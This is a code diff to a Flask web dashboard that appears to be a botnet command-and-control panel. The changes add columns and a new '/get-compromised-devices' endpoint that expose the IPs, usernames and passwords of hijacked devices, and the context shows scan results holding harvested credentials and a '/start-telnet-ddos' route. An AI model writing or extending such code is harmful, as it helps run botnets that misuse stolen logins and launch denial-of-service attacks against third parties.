@@ -260,6 +260,8 @@ HTML_TEMPLATE = '''
             <table>
                 <tr>
                     <th>IP Address</th>
+                    <th>Username</th>
+                    <th>Password</th>
                     <th>Status</th>
                     <th>Last Seen</th>
                     <th>Actions</th>
@@ -267,6 +269,8 @@ HTML_TEMPLATE = '''
                 {% for bot in bots %}
                 <tr>
                     <td>{{ bot.ip }}</td>
+                    <td>{{ bot.username }}</td>
+                    <td>{{ bot.password }}</td>
                     <td>{{ bot.status }}</td>
                     <td>{{ bot.last_seen }}</td>
                     <td>
@@ -391,9 +395,9 @@ def index():
     conn = sqlite3.connect('research_db.sqlite')
     cursor = conn.cursor()
     
-    # Get active bots
-    cursor.execute('SELECT ip, status, last_seen FROM devices WHERE status = "active" ORDER BY last_seen DESC')
-    bots = [{'ip': row[0], 'status': row[1], 'last_seen': row[2]} for row in cursor.fetchall()]
+    # Get active bots - Include username and password
+    cursor.execute('SELECT ip, username, password, status, last_seen FROM devices WHERE status = "online" ORDER BY last_seen DESC')
+    bots = [{'ip': row[0], 'username': row[1], 'password': row[2], 'status': row[3], 'last_seen': row[4]} for row in cursor.fetchall()]
     
     # Get only the latest scan result for each unique IP
     cursor.execute('''
@@ -651,6 +655,21 @@ def get_scan_results():
     results = [{'ip': row[0], 'port': row[1], 'service': row[2], 'credentials': row[3], 'timestamp': row[4]} for row in cursor.fetchall()]
     conn.close()
     return jsonify(results)
+
+@app.route('/get-compromised-devices', methods=['GET'])
+def get_compromised_devices():
+    """Get all compromised devices from the database."""
+    try:
+        conn = sqlite3.connect('research_db.sqlite')
+        cursor = conn.cursor()
+        cursor.execute('SELECT ip, username, password, status, last_seen FROM devices')
+        devices = [{'ip': row[0], 'username': row[1], 'password': row[2], 'status': row[3], 'timestamp': row[4]} for row in cursor.fetchall()]
+        conn.close()
+        logging.info(f"Fetched {len(devices)} compromised devices from database.")
+        return jsonify(devices)
+    except Exception as e:
+        logging.error(f"Error fetching compromised devices: {e}")
+        return jsonify({'error': str(e)}), 500
 
 @app.route('/start-telnet-ddos', methods=['POST'])
 def start_telnet_ddos():
